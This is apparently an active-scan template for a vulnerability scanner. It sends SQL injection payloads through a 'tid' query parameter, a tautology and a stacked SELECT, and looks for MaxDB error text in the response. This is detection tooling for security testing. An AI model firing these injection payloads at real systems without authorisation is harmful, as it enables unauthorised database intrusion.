id: sqli2-maxdb-15
name: 'SQLi error maxdb via tid'
severity: high
type: active
tags:
  - sqli
  - injection
  - maxdb
description: 'Triggers maxdb error via tid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      tid:
        - ''' OR ''1''=''1'
        - '''; SELECT 1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'MaxDB'
